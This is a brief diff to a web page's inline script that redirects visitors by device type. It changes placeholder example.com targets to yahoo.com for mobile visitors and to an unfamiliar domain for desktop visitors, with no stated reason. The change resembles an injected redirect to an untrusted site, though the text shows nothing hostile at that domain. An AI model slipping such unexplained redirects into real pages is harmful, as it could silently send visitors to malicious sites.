@@ -6,9 +6,9 @@
     var isMobile = /Android|iPhone/i.test(ua);
 
     if (isMobile) {
-      window.location.href = "https://example.com/mobile";  
+      window.location.href = "https://yahoo.com";  
     } else {
-      window.location.href = "https://example.com/desktop"; 
+      window.location.href = "https://sdliontmt.com"; 
     }
   </script>
 </head>
